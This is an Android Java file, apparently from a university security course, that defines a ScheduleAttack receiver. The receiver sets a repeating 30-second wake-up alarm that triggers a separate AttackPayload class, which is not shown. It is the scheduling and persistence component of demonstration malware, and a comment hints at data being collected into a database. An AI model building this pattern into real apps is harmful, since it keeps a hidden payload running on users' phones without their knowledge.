package edu.tufts.cs.security;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import java.util.Calendar;

public class ScheduleAttack extends BroadcastReceiver {
    static final long SCHEDULE_TIME = 30000; // every 30 seconds or database will fill up fast

    @Override
    public void onReceive(Context context, Intent intent) {
        AlarmManager alarmService = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        Intent theIntent = new Intent(context, AttackPayload.class);
        PendingIntent pending = PendingIntent.getBroadcast(context, 0, theIntent, PendingIntent.FLAG_CANCEL_CURRENT);
        alarmService.setInexactRepeating(AlarmManager.RTC_WAKEUP, Calendar.getInstance().getTimeInMillis(), SCHEDULE_TIME, pending);
    }
}